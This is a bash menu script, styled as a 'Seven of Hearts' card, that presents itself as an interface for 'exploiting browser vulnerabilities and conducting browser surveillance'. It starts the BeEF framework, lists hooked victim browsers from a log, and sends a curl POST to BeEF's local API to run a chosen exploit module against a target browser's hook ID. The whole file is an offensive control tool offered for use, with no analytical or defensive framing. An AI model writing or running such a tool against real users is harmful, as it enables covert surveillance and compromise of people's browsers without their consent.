#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Seven of Hearts Card
seven_of_hearts_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              Seven of Hearts                             |"
    echo "     |                     Exploit Browsers for Surveillance                    |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card provides an interface to utilize the BeEF framework for       |"
    echo "     |  exploiting browser vulnerabilities and conducting browser surveillance. |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. Start BeEF framework                                                 |"
    echo "     |  2. View active browser hooks                                            |"
    echo "     |  3. Execute a browser exploit                                            |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) start_beef ;;
        2) view_hooks ;;
        3) execute_exploit ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; seven_of_hearts_menu ;;
    esac
}

# Start BeEF framework
start_beef() {
    clear
    echo -e "${CYAN}Starting BeEF framework...${RESET}"
    if command -v beef-xss &>/dev/null; then
        beef-xss
    else
        echo -e "${CYAN}Error: BeEF is not installed.${RESET}"
        echo "Please install BeEF using your package manager or visit https://beefproject.com/."
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    seven_of_hearts_menu
}

# View active browser hooks
view_hooks() {
    clear
    echo -e "${CYAN}Viewing active browser hooks...${RESET}"
    if [[ -f /usr/share/beef-xss/logs/hooked-browsers.log ]]; then
        less /usr/share/beef-xss/logs/hooked-browsers.log
    else
        echo -e "${CYAN}Error: Hooked browsers log not found. Ensure BeEF is running.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    seven_of_hearts_menu
}

# Execute a browser exploit
execute_exploit() {
    clear
    echo -e "${CYAN}Executing a browser exploit...${RESET}"
    read -p "Enter the hook ID of the target browser: " hook_id
    read -p "Enter the exploit to execute (e.g., alert_dialog): " exploit
    curl -X POST "http://127.0.0.1:3000/api/hooks/$hook_id/modules/$exploit" \
        -H "Content-Type: application/json" \
        -d '{}'
    echo -e "${CYAN}Exploit executed on hook ID $hook_id.${RESET}"
    read -n 1 -s -r -p "Press any key to return to the menu..."
    seven_of_hearts_menu
}

seven_of_hearts_menu
